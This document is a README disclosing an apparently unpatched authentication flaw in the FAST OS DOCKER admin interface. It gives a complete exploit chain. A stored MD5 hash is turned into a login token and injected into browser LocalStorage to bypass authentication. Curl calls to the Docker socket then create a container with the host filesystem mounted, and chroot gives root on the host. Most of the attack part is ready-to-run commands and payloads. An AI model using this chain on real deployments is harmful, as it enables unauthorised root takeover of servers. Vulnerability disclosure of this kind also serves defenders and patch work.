# fast-os-docker-exploit
Use of Password Hash Instead of Password for Authentication in FAST OS DOCKER

https://hub.docker.com/r/wangbinxingkong/fast

This is a 0-day vulnerability. The latest version of the software is affected. To make use of
this vulnerability, an attacker must be able to read the FAST OS DOCKER configuration file,
which might be obtainable using another vulnerability (LFI, Path Traversal, XXE, Improper webserver
configuration). The consequence is RCE as root on the server host, even if the FAST OS DOCKER
application is running inside a docker container. FAST OS DOCKER hast 100k+ pulls according to
Dockerhub.

1. Read the `username` and `password` values from the `config/config.yaml` file.
Note that `password` is actually not the password, but a salted MD5 hash of the password.

2. Compute `<token> = MD5(<username> + <password>)`

3. Open the FAST OS DOCKER admin interface in your browser. By default, it is on
`http://<ip-address>:8081`

4. In the developer tools, add the following elements in the `LocalStorage` section:
`token: <token>`, `user: {"username": <username>, "token": <token>, "baseURL": "http://<ip-address>:8081"}`, `userList: [{"username": <username>, "token": <token>, "baseURL": "http://<ip-address>:8081"}]`

5. Open the FAST OS DOCKER admin interface again in the same tab (not the login page). When
going to the dashboard, you will be logged in automatically.

6. Go to the "Containers" section and open the command line webshell of the FAST OS DOCKER container.
You need to select `/bin/sh` as shell executable.

7. Execute the following commands in this shell to create a "privilege escalation" container:
```commandline
curl --unix-socket /var/run/docker.sock -s "http:/v1.40/images/create?fromImage=ubuntu&tag=latest" -X POST -H 'Content-Type: application/json'

curl --unix-socket /var/run/docker.sock -s "http:/v1.40/containers/create" -X POST -H 'Content-Type: application/json' -d '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "ubuntu","Volumes": {"/hostfs/": {}},"HostConfig": {"Binds": ["/:/hostfs"]}}'
```

8. Go back to the "Containers" tab and start the newly created container. Then, open the webshell
of the newly created container, this time selecting `/bin/bash`.

9. Execute `chroot /hostfs` in the open webshell.

10. You should now be able to execute commands as root on the host system.
